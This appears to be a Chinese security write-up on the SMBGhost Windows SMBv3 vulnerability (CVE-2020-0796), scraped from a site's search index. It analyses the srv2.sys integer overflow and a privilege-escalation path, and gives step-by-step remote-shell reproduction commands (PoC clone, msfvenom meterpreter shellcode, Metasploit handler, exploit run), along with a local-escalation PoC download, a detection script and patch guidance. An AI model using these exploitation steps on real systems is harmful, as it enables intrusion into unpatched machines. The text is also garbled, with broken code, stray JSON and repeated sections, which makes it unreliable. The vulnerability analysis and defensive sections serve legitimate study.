\u6ce8\u610f\uff1a\u8fd8\u6709\u4e00\u4e2aSrvDisableNetBufferLookAsideList\u6807\u5fd7\u4f1a\u5f71\u54cd\u51fd\u6570\u7684\u529f\u80fd\uff0c\u4f46\u662f\u5b83\u662f\u7531\u4e00\u4e2a\u672a\u8bb0\u5f55\u7684\u6ce8\u518c\u8868\u8bbe\u7f6e\u6765\u8bbe\u7f6e\u7684\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5904\u4e8e\u7981\u7528\u72b6\u6001\uff0c\u56e0\u6b64\u5e76\u4e0d\u662f\u5f88\u6709\u8da3\u3002 Lookaside\u5217\u8868\u7528\u4e8e\u6709\u6548\u5730\u4e3a\u9a71\u52a8\u7a0b\u5e8f\u4fdd\u7559\u4e00\u7ec4\u53ef\u91cd\u7528\u7684\u3001\u56fa\u5b9a\u5927\u5c0f\u7684\u7f13\u51b2\u533a\u3002lookaside\u5217\u8868\u7684\u529f\u80fd\u4e4b\u4e00\u662f\u5b9a\u4e49\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5206\u914d/\u91ca\u653e\u51fd\u6570\uff0c\u7528\u4e8e\u7ba1\u7406\u7f13\u51b2\u533a\u3002\u67e5\u770bSrvNetBufferLookasides\u6570\u7ec4\u7684\u5f15\\ \u7528\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u662f\u5728SrvNetCreateBufferLookasides\u51fd\u6570\u4e2d\u521d\u59cb\u5316\u7684\uff0c\u901a\u8fc7\u67e5\u770b\u5b83\uff0c\u6211\u4eec\u4e86\u89e3\u5230\u4ee5\u4e0b\u5185\u5bb9\uff1a \u81ea\u5b9a\u4e49\u5206\u914d\u51fd\u6570\u5b9a\u4e49\u4e3aSrvNetBufferLookasideAllocate\uff0c\u5b83\u53ea\u8c03\u7528 SrvNetAllocateBufferFromPool 9\u4e2alookaside\u5217\u8868\u6309\u4ee5\u4e0b\u5927\u5c0f\u521b\u5efa\uff0c\u6211\u4eec\u4f7f\u7528Python\u5feb\u901f\u8ba1\u7b97\uff1a >>> [hex((1 \\ \\ (i + 12)) + 256) for i in range(9)] '0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100', '0x40100',\\ '0x80100', '0x100100' '0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100', '0x40100',\\ '0x80100', '0x100100' \u8fd9\u4e0e\u6211\u4eec\u7684\u53d1\u73b0\u76f8\u5339\u914d\uff0c\u5373\u5206\u914d\u5927\u4e8e0x100100\u5b57\u8282\u7684\u5206\u914d\u65f6\u4e0d\u4f7f\u7528lookaside\u5217\u8868\u3002 \u7ed3\u8bba\u662f\u6bcf\u4e2a\u5206\u914d\u8bf7\u6c42\u6700\u7ec8\u90fd\u51fa\u73b0\u5728SrvNetAllocateBufferFromPool\u51fd\u6570\u4e2d\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u6765\u5206\u6790\u5b83\u3002 5\u3001SrvNetAllocateBufferFromPool\u548c\u5206\u914d\u7684\u7f13\u51b2\u533a\u5e03\u5c40 SrvNetAllocateBufferFromPool\u51fd\u6570\u4f7f\u7528ExAllocatePoolWithTag\u51fd\u6570\u5728NonPagedPoolNx\u6c60\u4e2d\u5206\u914d\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u7136\u540e\u7528\u6570\u636e\u586b\u5145\u4e00\u4e9b\u7ed3\u6784\u3002\u5206\u914d\u7684\u7f13\u51b2\u533a\u7684\u5e03\u5c40\u5982\u4e0b\uff1a \u5728\u6211\u4eec\u7684\u7814\u7a76\u8303\u56f4\u5185\uff0c\u6b64\u5e03\u5c40\u7684\u552f\u4e00\u76f8\u5173\u90e8\u5206\u662f\u7528\u6237\u7f13\u51b2\u533a\u548c\u5206\u914d\u5934\u7ed3\u6784\u3002\u6211\u4eec\u53ef\u4ee5\u9a6c\u4e0a\u770b\u5230\uff0c\u901a\u8fc7\u6ea2\u51fa\u7528\u6237\u7f13\u51b2\u533a\uff0c\u6211\u4eec\u6700\u7ec8\u4f1a\u91cd\u5199ALLOCATION_HEADER\u7ed3\u6784\u3002\u770b\u8d77\u6765\u5f88\u65b9\u4fbf\u3002 6\u3001\u91cd\u5199\u5206\u914d\u5934\u7ed3\u6784 \u6b64\u65f6\uff0c\u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\uff0c\u7531SmbCompressionDecompress\u8c03\u7528\u4e4b\u540e\u7684\u68c0\u67e5\uff1a gt ; if ( Status \\ lt ; 0 \\ | \\ | FinalCompressedSize != gt ; Header - \\ gt ; OriginalCompressedSegmentSize ) { SrvNetFreeBuffer ( Alloc ); gt ; return STATUS_BAD_DATA ; } SrvNetFreeBuffer\u5c06\u88ab\u8c03\u7528\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5c06\u5931\u8d25\uff0c\u56e0\u4e3a\u6211\u4eec\u5c06\u5176\u8bbe\u8ba1OriginalCompressedSegmentSize\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\uff0c\u5e76\u4e14FinalCompressedSize\u5c06\u6210\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u4ee3\u8868\u5b9e\u9645\u7684\u89e3\u538b\u7f29\u5b57\u8282\u6570\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5206\u6790\u4e86\u8be5SrvNetFreeBuffer\u51fd\u6570\uff0c\u6210\u529f\u5730\u66ff\u6362\u4e86\u4e00\u4e2a\u5e7b\u6570\u7684\u5206\u914d\u6307\u9488\uff0c\u7136\u540e\u7b49\u5f85free\u51fd\u6570\u5c1d\u8bd5\u5bf9\u5176\u8fdb\u884c\u91ca\u653e\uff0c\u4ee5\u671f\u7a0d\u540e\u5c06\u5176\u7528\u4e8efree\u00adafter\u00adfree\u6216\u7c7b\u4f3c\u7528\u9014\u3002\u4f46\u662f\u4ee4\u6211\u4eec\u60ca\u8bb6\u7684\u662f\uff0c\u8be5memcpy\u51fd\u6570\u5d29\u6e83\u4e86\u3002\u8fd9\u4f7f\u6211\u4eec\u611f\u5230\u9ad8\u5174\uff0c\u56e0\u4e3a\u6211\u4eec\u6839\u672c\u6ca1\u6709\u60f3\u5230\u54ea\u91cc\uff0c\u4f46\u6211\u4eec\u5fc5\u987b\u68c0\u67e5\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\u3002\u53ef\u4ee5\u5728SmbCompressionDecompress\u51fd\u6570\u7684\u5b9e\u73b0\u4e2d\u627e\u5230\u8bf4\u660e\uff1a gt ; NTSTATUS SmbCompressionDecompress ( USHORT CompressionAlgorithm , PUCHAR gt ; UncompressedBuffer , ULONG UncompressedBufferSize , PUCHAR CompressedBuffer , gt ; ULONG CompressedBufferSize , PULONG FinalCompressedSize ) { gt ; // ... gt ; NTSTATUS Status = RtlDecompressBufferEx2 ( gt ; ..., gt ; FinalUncompressedSize , gt ; ...); gt ; if ( Status \\ gt ; = 0 ) { gt ; \\ * FinalCompressedSize = CompressedBufferSize ; gt ; } gt ; // ... gt ; return Status ; } \u57fa\u672c\u4e0a\uff0c\u5982\u679c\u89e3\u538b\u6210\u529f\uff0cFinalCompressedSize\u5c06\u66f4\u65b0\u4e3a\u4fdd\u5b58CompressedBufferSize\u7684\u503c\uff0c\u5b83\u662f\u7f13 \u51b2\u533a\u7684\u5927\u5c0f\u3002\u8fd9\u79cd\u5bf9FinalCompressedSize\u8fd4\u56de\u503c\u7684\u6545\u610f\u66f4\u65b0\u5bf9\u6211\u4eec\u6765\u8bf4\u4f3c\u4e4e\u975e\u5e38\u53ef\u7591\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5c0f\u7ec6\u8282\uff0c\u52a0\u4e0a\u5206\u914d\u7684\u7f13\u51b2\u533a\u5e03\u5c40\uff0c\u5141\u8bb8\u975e\u5e38\u65b9\u4fbf\u5730\u5229\u7528\u8fd9\u4e2abug\u3002 \u7531\u4e8e\u6267\u884c\u7ee7\u7eed\u5230\u590d\u5236\u539f\u59cb\u6570\u636e\u7684\u9636\u6bb5\uff0c\u8ba9\u6211\u4eec\u518d\u6b21\u68c0\u67e5\u8c03\u7528\uff1a memcpy \uff08 gt ; Alloc - \\ gt ; UserBuffer \uff0c gt ; \uff08 PUCHAR \uff09\u6807\u9898 + sizeof \uff08 COMPRESSION_TRANSFORM_HEADER \uff09\uff0c Header - \\ gt ; Offset \uff09 ; \u4eceALLOCATION_HEADER\u7ed3\u6784\u4e2d\u8bfb\u53d6\u76ee\u6807\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6\u8be5\u7ed3\u6784\u3002\u7f13\u51b2\u533a\u7684\u5185\u5bb9\u548c\u5927\u5c0f\u4e5f\u7531\u6211\u4eec\u63a7\u5236\u3002 7\u3001\u672c\u5730\u6743\u9650\u63d0\u5347 \u65e2\u7136\u6211\u4eec\u6709\u4e86\u5199\u5728\u54ea\u91cc\u5f00\u53d1\uff0c\u6211\u4eec\u80fd\u7528\u5b83\u505a\u4ec0\u4e48\uff1f\u5f88\u660e\u663e\u6211\u4eec\u53ef\u4ee5\u8ba9\u7cfb\u7edf\u5d29\u6e83\u3002\u6211\u4eec\u53ef\u80fd\u80fd\u591f\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u6211\u4eec\u8fd8\u6ca1\u6709\u627e\u5230\u8fd9\u6837\u505a\u7684\u65b9\u6cd5\u3002\u5982\u679c\u6211\u4eec\u5728\u672c\u5730\u4e3b\u673a\u4e0a\u4f7f\u7528\u6b64\u6f0f\u6d1e\u5e76\u6cc4\u6f0f\u5176\u4ed6\u4fe1\u606f\uff0c \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e\u672c\u5730\u6743\u9650\u63d0\u5347\uff0c\u56e0\u4e3a\u5df2\u7ecf\u901a\u8fc7\u51e0\u79cd\u6280\u672f\u8bc1\u660e\u4e86\u8fd9\u4e00\u70b9 \u6211\u4eec\u5c1d\u8bd5\u7684\u7b2c\u4e00\u79cd\u6280\u672f\u662fMorten Schenk\u5728\u5176\u300a Black Hat USA 2017\u300b\u6f14\u8bb2\u4e2d\u63d0\u51fa\u7684 \u3002\u8be5\u6280\u672f\u6d89\u53ca\u91cd\u5199win32\u7684.data\u90e8\u5206\u4e2d\u7684\u51fd\u6570\u6307\u9488\u6570\u636e\u5e93\u7cfb\u7edf\u9a71\u52a8\u7a0b\u5e8f\uff0c\u7136\u540e\u4ece\u7528\u6237\u6a21\u5f0f\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u4ee5\u83b7\u5f97\u4ee3\u7801\u6267\u884c\u3002j00ru\u5199\u4e86\u4e00\u7bc7\u5173\u4e8e\u5728WCTF 2018\u4e2d\u4f7f\u7528\u6b64\u6280\u672f\u7684\u7cbe\u5f69\u6587\u7ae0\uff0c\u5e76\u63d0\u4f9b\u4e86\u4ed6\u7684\u6f0f\u6d1e\u6e90\u4ee3\u7801\u3002\u6211\u4eec\u9488\u5bf9write what where\u6f0f\u6d1e\u8fdb\u884c\u4e86\u8c03\u6574\uff0c\u4f46\u53d1\u73b0\u5b83\u4e0d\u8d77\u4f5c\u7528\uff0c\u56e0\u4e3a\u5904\u7406SMB\u6d88\u606f\u7684\u7ebf\u7a0b\u4e0d\u662fGUI\u7ebf \u7a0b\u3002\u56e0\u6b64\uff0cwin32\u6570\u636e\u5e93\u7cfb\u7edf\u6ca1\u6709\u6620\u5c04\uff0c\u800c\u4e14\u6280\u672f\u4e5f\u4e0d\u76f8\u5173\uff08\u9664\u975e\u6709\u529e\u6cd5\u4f7f\u5b83\u6210\u4e3a\u4e00\u4e2aGUI\u7ebf\u7a0b\uff0c\u8fd9\u662f\u6211\u4eec\u6ca1\u6709\u7814\u7a76\u8fc7\u7684\uff09\u3002 \u6211\u4eec\u6700\u7ec8\u57282012\u5e74\u7684\u9ed1\u5e3d\u6f14\u793a\u4e2d\u4f7f\u7528\u4e86cesarcer\u6240\u4ecb\u7ecd\u7684\u8457\u540d\u6280\u672f---\u8f7b\u677e\u672c\u5730Windows\u5185\u6838\u5f00\u53d1\u3002 \u8be5\u6280\u672f\u662f\u901a\u8fc7\u4f7f\u7528NtQuerySystemInformation\uff08SystemHandleInformation\uff09API\u6cc4\u6f0f\u5f53\u524d\u8fdb\u7a0b\u4ee4\u724c \u5730\u5740\uff0c\u7136\u540e\u91cd\u5199\u8be5\u5730\u5740\uff0c\u6388\u4e88\u5f53\u524d\u8fdb\u7a0b\u4ee4\u724c\u6743\u9650\uff0c\u8fd9\u4e9b\u6743\u9650\u53ef\u7528\u4e8e\u6743\u9650\u63d0\u5347\u3002Bryan Alexander\uff08dronesec\uff09\u548cStephen Breen\uff08breenmachine\uff09\uff082017\uff09\u5728EoP\u7814\u7a76\u4e2d\u6ee5\u7528\u4ee3\u7406\u6743\u9650\uff0c \u5c55\u793a\u4e86\u4f7f\u7528\u5404\u79cd\u4ee4\u724c\u7279\u6743\u63d0\u5347\u7279\u6743\u7684\u51e0\u79cd\u65b9\u6cd5\u3002 \u6211\u4eec\u57fa\u4e8eAlexandre Beaulieu\u5728\u5229\u7528\u4efb\u610f\u5199\u64cd\u4f5c\u63d0\u5347\u6743\u9650writeup\u65f6\u5171\u4eab\u7684\u4ee3\u7801\u8fdb\u884c\u653b\u51fb\u3002\u5728\u4fee\u6539\u8fdb\u7a0b\u7684\u4ee4\u724c\u7279\u6743\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u5c06DLL\u6ce8\u5165winlogon.exe. DLL\u7684\u5168\u90e8\u76ee\u7684\u662f\u542f\u52a8\u547d\u4ee4\u63d0\u793a\u7b26. \u6211\u4eec\u7684\u5b8c\u6574\u672c\u5730\u7279\u6743\u5347\u7ea7\u8bc1\u660e\u53ef\u5728*\u6b64\u5904*\u627e\u5230\uff0c\u4ec5\u53ef\u7528\u4e8e\u7814\u7a76/\u9632\u5fa1\u76ee\u7684\u3002 \u56db\u3001CVE\u00ad2020\u00ad0796 RCE\u6f0f\u6d1e\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1akal2019 ip:192.168.1.101 \u76ee\u6807\u9776\u673a\uff1awindows10 1903 x64 (\u4e13\u4e1a\u7248\uff0c\u4f01\u4e1a\u7248\u4e5f\u53ef\u4ee5\uff09 ip:192.168.1.103 \u76ee \u6807 \u9776 \u673a \u7684 \u4e0b \u8f7d \u5730 \u5740 \uff1a ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936| 47D4C57E638DF8BF74C59261E2CE702D|/ \u73af\u5883\u8981\u6c42\uff1a \u8be5poc\u4e0d\u592a\u7a33\u5b9a\uff0c\u9700\u8981\u591a\u6b21\u6d4b\u8bd5(\u731c\u6d4b\u662f\u5360\u7528\u76d1\u542c\u7aef\u53e3\u6216\u8005\u7f51\u7edc\u95ee\u9898\uff09\uff0c\u6709\u53ef\u80fd\u51fa\u73b0\u84dd\u5c4f\u73b0\u8c61(2).\u5982\u679cPOC\u5931\u8d25\uff0c\u53ef\u80fd\u662f\u76ee\u6807\u7cfb\u7edf\u5f00\u542f\u7cfb\u7edf\u81ea\u5e26\u7684defender\u62e6\u622a\u4e86\u3002 \u590d\u73b0\u6b65\u9aa4 kali\u4e0b\u514b\u9686\u4e0b\u8f7d\u5229\u7528poc root\\@kali2019:/opt\\# git clone* https://github.com/ianxtianxt/SMBGhost_RCE_PoC.git \u5207\u6362\u5230\u5229\u7528poc\u76ee\u5f55\u4e0b root\\@kali2019:/opt\\# cd SMBGhost_RCE_PoC/ \u8be5POC\u9700\u8981\u7528python3\u73af\u5883\u6267\u884c \u53ef\u4ee5\u770b\u5230\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u4ee5\u53ca\u7cfb\u7edf\u7248\u672c \u5728kali\u4e0b\u751f\u6210python\u7248\u672c\u7684\u53cd\u5f39shellcode root\\@kali2019:\\~\\# msfvenom ``\u00ad``p windows/x64/meterpreter/bind_tcp lport=2333 ``\u00ad``f py ``\u00ad``o exp.py \u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684shellcode root\\@kali2019:~# cat exp.py \u5c06\u751f\u6210\u7684exp.py\u4ee3\u7801\u4e2d\u7684\u53d8\u91cfbuf\u5168\u90e8\u66ff\u6362\u6210\u53d8\u91cfUSER_PAYLOAD\uff0c\u7136\u540e\u5c06\u6240\u6709\u4ee3\u7801\u7c98\u8d34\u8986\u76d6\u4e0b\u9762\u7684\u4ee3\u7801\u5904\uff1a \u5728kali\u4e0a\u542f\u52a8MSF\uff0c\u5e76\u5982\u4e0b\u8bbe\u7f6e msf5 \\ use exploit/multi/handler msf5 exploit(multi/handler) \\ set payload windows/x64/meterpreter/bind_tcp \\ #\u8bbe\u7f6e\u53cd\u5f39\u6a21\u5f0fmsf5 exploit(multi/handler) > set rhost 192.168.1.103\\ #\u8bbe\u7f6e\u76ee\u6807\u9776\u673aIP\u5730\u5740 msf5 exploit(multi/handler) \\ set lport 2333 \\#\u8bbe\u7f6e\u76d1\u542c\u7aef\u53e3msf5 \\ exploit(multi/handler) \\ exploit \u6267\u884c\u5229\u7528poc\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\uff0c\u5728\u6309\u4efb\u610f\u952e\uff0c\u6700\u597d\u56de\u8f66\u952e\u5373\u53ef python3 exploit.py ``\u00ad``ip 192.168.1.103 \u5728msf\u53ef\u4ee5\u770b\u5230\u6210\u529f\u53cd\u5f39\u51fa\u76ee\u6807\u9776\u673a\u7684shell \u4e94\u3001CVE\u00ad2020\u00ad0796 \u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u590d\u73b0 \u73af\u5883\u8981\u6c42\uff0c\u9700\u8981windows 10 1909 x64 \u4e0b \u8f7d \u5730 \u5740 \uff1a\\ ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|\\ 9BCD5FA6C8009E4D0260E4B23008BD47|/ \u63d0\u6743POC: https://download.0-sec.org/\u7cfb\u7edf\u5b89\u5168/Windows/CVE-2020-0796\u63d0\u6743poc.zip \u8fd9\u91cc\u6211\u65b0\u5efa\u4e86\u4e00\u4e2a\u666e\u901a\u6743\u9650\u7684\u8d26\u53f7\uff0c\u53ef\u4ee5\u770b\u5230\u6743\u9650\u5f88\u5c0f \u5728\u666e\u901a\u8d26\u53f7\u4e0a\u6267\u884ccve\u00ad2020\u00ad0796\u00adlocal.exe\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u63d0\u6743\u5230system\u6743\u9650 \u516d\u3001\u6f0f\u6d1e\u68c0\u6d4b \u5947 \u5b89 \u4fe1 \u6279 \u91cf \u68c0 \u6d4b \u5de5 \u5177 \uff1a http://dl.qianxin.com/skylar6/CVE \u00ad2020\u00ad0796\u00adScanner.zip sh \u811a \u672c \u68c0 \u6d4b \uff1a https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de9\\ 37f5b6810df4441cc84f0fa63991e2e/check\u00adsmb\u00adv3.11.sh #!/bin/bash if [ $# -eq 0 ] then echo $ Usage:\\n\\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR exit 1 fi echo Checking if there s SMB v3.11 in $1 ... nmap -p445 --script smb-protocols -Pn -n $1 | grep -P \\d+\\.\\d+\\.\\d+\\.\\d+|^\\|.\\s+3.11 | tr \\n | replace Nmap scan report for @ | tr @ \\n | grep 3 .11 | tr | | tr _ | grep -oP \\d+\\.\\d+\\.\\d+\\.\\d+ if [[ $? ! = 0 ]] ; then echo There s no SMB v3.11 fi \u4e03\u3001\u6f0f\u6d1e\u4fee\u590d \u66f4\u65b0\uff0c\u5b8c\u6210\u8865\u4e01\u7684\u5b89\u88c5\u3002 \u64cd\u4f5c\u6b65\u9aa4\uff1a\u8bbe\u7f6e\u00ad>\u66f4\u65b0\u548c\u5b89\u5168\u00ad>Windows\u66f4\u65b0\uff0c\u70b9\u51fb\"\u68c0\u67e5\u66f4\u65b0\"\u3002 \u5fae\u8f6f\u7ed9\u51fa\u4e86\u4e34\u65f6\u7684\u5e94\u5bf9\u529e\u6cd5\uff1a \u8fd0\u884cregedit.exe\uff0c\u6253\u5f00\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u5728HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u5efa\u7acb\u4e00\u4e2a\u540d\u4e3aDisableCompression\u7684DWORD\uff0c\u503c\u4e3a1\uff0c\u7981\u6b62SMB\u7684\u538b\u7f29\u529f\u80fd\u3002 \u5bf9SMB\u901a\u4fe1445\u7aef\u53e3\u8fdb\u884c\u5c01\u7981\u3002 \u8865\u4e01\u94fe\u63a5 https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762 \u516b\u3001\u53c2\u8003\u8fde\u63a5 https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html > https://github.com/danigargu/CVE \u00ad2020\u00ad0796 http://dl.qianxin.com/skylar6 https://github.com/ollypwn/SMBGhost https://github.com/chompie1337/SMBGhost _RCE_PoC https://github.com/danigargu/CVE \u00ad2020\u00ad0796 https://blog.zecops.com/vulnerabilities/exploiting \u00adsmbghost\u00adcve\u00ad2020\u00ad0796\u00adfor\u00ada\u00adlocal\u00adprivilege\u00adescalation\u00adwriteup\u00adand\u00adpoc/","title":"\uff08CVE\u00ad 2020\u00ad 0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve-2020-0796-windows","text":"","title":"\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_1","text":"\u6f0f\u6d1e\u516c\u544a\u663e\u793a\uff0cSMB 3.1.1\u534f\u8bae\u4e2d\u5904\u7406\u538b\u7f29\u6d88\u606f\u65f6\uff0c\u5bf9\u5176\u4e2d\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7\u5b89\u5168\u68c0\u67e5\uff0c\u76f4\u63a5\u4f7f\u7528\u4f1a\u5f15\u53d1\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u65e0\u987b\u6743\u9650\u5373\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u53d7\u9ed1\u5ba2\u653b\u51fb\u7684\u76ee\u6807\u7cfb\u7edf\u53ea\u9700\u5f00\u673a\u5728\u7ebf\u5373\u53ef\u80fd\u88ab\u5165\u4fb5\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_2","text":"Windows 10 1903\u7248\u672c\uff08\u7528\u4e8e\u57fa\u4e8ex32\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 Windows 10 1909\u7248\u672c\uff08\u7528\u4e8e\u57fa\u4e8ex32\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1909\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server\u7248\u672c1909\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_3","text":"","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_4","text":"\u6f0f\u6d1e\u516c\u544a\u663e\u793a\uff0cSMB 3.1.1\u534f\u8bae\u4e2d\u5904\u7406\u538b\u7f29\u6d88\u606f\u65f6\uff0c\u5bf9\u5176\u4e2d\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7\u5b89\u5168\u68c0\u67e5\uff0c\u76f4\u63a5\u4f7f\u7528\u4f1a\u5f15\u53d1\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u65e0\u987b\u6743\u9650\u5373\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u53d7\u9ed1\u5ba2\u653b\u51fb\u7684\u76ee\u6807\u7cfb\u7edf\u53ea\u9700\u5f00\u673a\u5728\u7ebf\u5373\u53ef\u80fd\u88ab\u5165\u4fb5\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#1","text":"\u6f0f\u6d1e\u53d1\u751f\u5728srv2.sys\u4e2d,\u7531\u4e8eSMB\u6ca1\u6709\u6b63\u786e\u5904\u7406\u538b\u7f29\u7684\u6570\u636e\u5305,\u5728\u89e3\u538b\u6570\u636e\u5305\u7684\u65f6\u5019\u4f7f\u7528\u5ba2\u6237\u7aef\u4f20\u8fc7\u6765\u7684\u957f\u5ea6\u8fdb\u884c\u89e3\u538b\u65f6,\u5e76\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6\u662f\u5426\u5408\u6cd5.\u6700\u7ec8\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002","title":"1\u3001\u6839\u672c\u539f\u56e0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#2","text":"\u8be5\u9519\u8bef\u662f\u53d1\u751f\u5728srv2.sys SMB\u670d\u52a1\u5668\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u7684Srv2DecompressData\u51fd\u6570\u4e2d\u7684\u6574\u6570\u6ea2\u51fa\u9519\u8bef\u3002\u8fd9\u662f\u8be5\u51fd\u6570\u7684\u7b80\u5316\u7248\u672c\uff0c\u7701\u7565\u4e86\u4e0d\u76f8\u5173\u7684\u7ec6\u8282\uff1a typedef struct \\ _COMPRESSION_TRANSFORM_HEADER { gt ; ULONG ProtocolId ; gt ; ULONG OriginalCompressedSegmentSize ; USHORT CompressionAlgorithm ; gt ; USHORT Flags ; ULONG Offset ; } COMPRESSION_TRANSFORM_HEADER , \\ * PCOMPRESSION_TRANSFORM_HEADER ; typedef struct \\ _ALLOCATION_HEADER { gt ; // ... gt ; PVOID UserBuffer ; gt ; // ... } ALLOCATION_HEADER , \\ * PALLOCATION_HEADER ; NTSTATUS Srv2DecompressData ( PCOMPRESSION_TRANSFORM_HEADER Header , SIZE_T TotalSize ) { gt ; PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer ( gt ; ( ULONG )( Header - \\ gt ; OriginalCompressedSegmentSize + Header - \\ gt ; Offset ), NULL ); gt ; If ( ! Alloc ) { gt ; return STATUS_INSUFFICIENT_RESOURCES ; gt ; } gt ; ULONG FinalCompressedSize = 0 ; gt ; NTSTATUS Status = SmbCompressionDecompress ( Header - \\ gt ; CompressionAlgorithm , gt ; ( PUCHAR ) Header + sizeof ( COMPRESSION_TRANSFORM_HEADER ) + Header - \\ gt ; Offset , gt ; ( ULONG )( TotalSize - sizeof ( COMPRESSION_TRANSFORM_HEADER ) - Header - \\ gt ; Offset ), gt ; ( PUCHAR ) Alloc - \\ gt ; UserBuffer + Header - \\ gt ; Offset , gt ; Header - \\ gt ; OriginalCompressedSegmentSize , \\ amp ; FinalCompressedSize ); gt ; if ( 